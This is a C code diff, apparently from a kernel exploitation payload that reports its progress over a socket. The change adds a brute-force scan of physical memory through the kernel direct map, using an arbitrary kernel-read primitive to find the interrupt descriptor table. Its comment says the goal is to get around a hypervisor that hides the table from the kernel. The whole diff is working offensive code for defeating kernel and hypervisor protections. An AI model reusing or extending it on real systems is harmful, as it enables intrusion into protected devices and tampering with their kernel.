@@ -4271,7 +4271,9 @@ broad_done:
             }
 
             if (!idt_found) {
-                send_response(sock, "  IDT not found in kernel .data\n");
+                send_response(sock, "  IDT not in kernel .data; "
+                              "brute-force scanning physical memory "
+                              "via DMAP...\n");
                 send_response(sock, "  Diag: kdata=0x%lx ktext=0x%lx "
                               "dmap=0x%lx\n", kdata, ktext, dmap_base);
                 send_response(sock, "  Diag: r_idt candidates=%d "
@@ -4279,7 +4281,79 @@ broad_done:
                               ridt_candidates_total,
                               ridt_candidates_rejected,
                               ridt_probed);
-                goto step7_cleanup;
+
+                /* Brute-force: scan physical memory 0..512MB via DMAP
+                 * looking for IDT gate patterns at any 16-byte offset.
+                 * The IDT must exist in physical RAM; even if the HV
+                 * hides it from the kernel's VA space, DMAP may still
+                 * map those physical pages. */
+                uint64_t phys_scan_end = 0x20000000ULL; /* 512MB */
+                int phys_pages_read = 0;
+                int phys_pages_fail = 0;
+                for (uint64_t pa = 0;
+                     pa < phys_scan_end && !idt_found;
+                     pa += 4096) {
+                    if ((pa & 0x1FFFFFF) == 0)
+                        send_response(sock, "  ...PA %luMB\n",
+                            (unsigned long)(pa >> 20));
+                    if (kernel_copyout(dmap_base + pa,
+                                       page, 4096) != 0) {
+                        phys_pages_fail++;
+                        continue;
+                    }
+                    phys_pages_read++;
+
+                    for (int poff = 0;
+                         poff + 64 <= 4096 && !idt_found;
+                         poff += 16) {
+                        int valid = 0;
+                        for (int v = 0; v < 4; v++) {
+                            uint8_t *g = page + poff + v * 16;
+                            if (!(g[5] & 0x80))
+                                continue;
+                            uint8_t type = g[5] & 0x0F;
+                            if (type != 14 && type != 15)
+                                continue;
+                            uint32_t rsvd;
+                            memcpy(&rsvd, g + 12, 4);
+                            if (rsvd != 0)
+                                continue;
+                            uint64_t h = (uint64_t)g[0] |
+                                ((uint64_t)g[1] << 8) |
+                                ((uint64_t)g[6] << 16) |
+                                ((uint64_t)g[7] << 24) |
+                                ((uint64_t)g[8] << 32) |
+                                ((uint64_t)g[9] << 40) |
+                                ((uint64_t)g[10] << 48) |
+                                ((uint64_t)g[11] << 56);
+                            if (h >= 0xFFFF800000000000ULL)
+                                valid++;
+                        }
+                        if (valid >= 3) {
+                            idt_found = 1;
+                            idt_base = dmap_base + pa + poff;
+                            idt_access = idt_base; /* via DMAP */
+                            uint16_t sel;
+                            memcpy(&sel, page + poff + 2, 2);
+                            send_response(sock,
+                                "  IDT found at PA 0x%lx+0x%x "
+                                "(%d/4 valid, CS=0x%04x) "
+                                "[%d pages read, %d failed]\n",
+                                pa, poff, valid, sel,
+                                phys_pages_read,
+                                phys_pages_fail);
+                        }
+                    }
+                }
+
+                if (!idt_found) {
+                    send_response(sock,
+                        "  DMAP brute-force: no IDT in %luMB "
+                        "(%d read, %d failed)\n",
+                        (unsigned long)(phys_scan_end >> 20),
+                        phys_pages_read, phys_pages_fail);
+                    goto step7_cleanup;
+                }
             }
         }
 
